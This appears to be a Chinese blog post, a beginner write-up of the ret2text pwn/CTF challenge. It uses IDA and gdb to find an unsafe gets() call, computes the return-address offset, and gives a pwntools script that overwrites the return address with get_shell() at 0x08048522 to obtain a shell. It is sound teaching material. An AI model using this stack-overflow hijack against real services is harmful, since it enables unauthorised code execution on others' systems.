---
layout:     post
title:      pwn学习（一）：栈溢出覆盖返回地址
subtitle:   利用栈溢出获取控制权
date:       2021-08-07
author:     Hongtai S
header-img: img/5.jpg
catalog: true
tags:
    - 漏洞
    - 二进制
    - pwn
---
# 栈溢出覆盖返回地址 #


## ret2text题目分析 ##

将文件ret2text拖入Ida中查看还原的C代码：

![1.PNG](https://i.loli.net/2021/08/07/5DFHOYzJjEMqRpt.png)

看到可以的函数vulnerable()，跟进查看：

![2.PNG](https://i.loli.net/2021/08/07/nEvxPSeLVlBYT9U.png)

发现不安全的gets()函数,能够利用栈溢出覆盖返回地址以获取一次劫持程序执行流的机会。

继续寻找能够利用的跳转地址，发现程序中包含get_shell()函数，跟进：

![3.PNG](https://i.loli.net/2021/08/07/J6ucoV7dN4yfRMS.png)

![4.PNG](https://i.loli.net/2021/08/07/GOHkcoy9vKeudPp.png)

刚好是能够获取目标系统的shell函数，入口地址为0x08048522，将返回地址覆盖为入口地址即可成功获取shell
在Ida中显示函数vulnerable()的buffer字符串与ebp的距离为10h，栈中返回地址前需要填充10h(与ebp距离) + 4(ebp)大小的字符串也就是"AAAA" * 4 + "BBBB"，最后加上get_shell()的入口地址0x08048522。

gdb动态调试验证：

跟进vulnerable()函数，输入字符串AAAA后查看栈中情况：

![5.PNG](https://i.loli.net/2021/08/07/iBRWqTX86PlJdGv.png)

可以看到从字符串起止地址覆盖到返回地址总共需要20个字符，与实际情况相符。

## 编写脚本 ##

 ```python
from pwn import *

#远程连接服务器使用remote函数
#io = remote("ip", port)

#使用本地进程测试使用process函数
io = process("ret2text")

#接受程序的一行打印
io.recvline()

#构造覆盖返回地址的字符串，注意要将数据转为字节的形式
overflow = b'AAAA' * 5 + p32(0x8048522)

#发送构造的数据
io.sendline(overflow)

#获取shell交互权限
io.interactive()

```

运行脚本成功获取shell权限
![7.PNG](https://i.loli.net/2021/08/07/vStumLenk1B2C4Z.png)



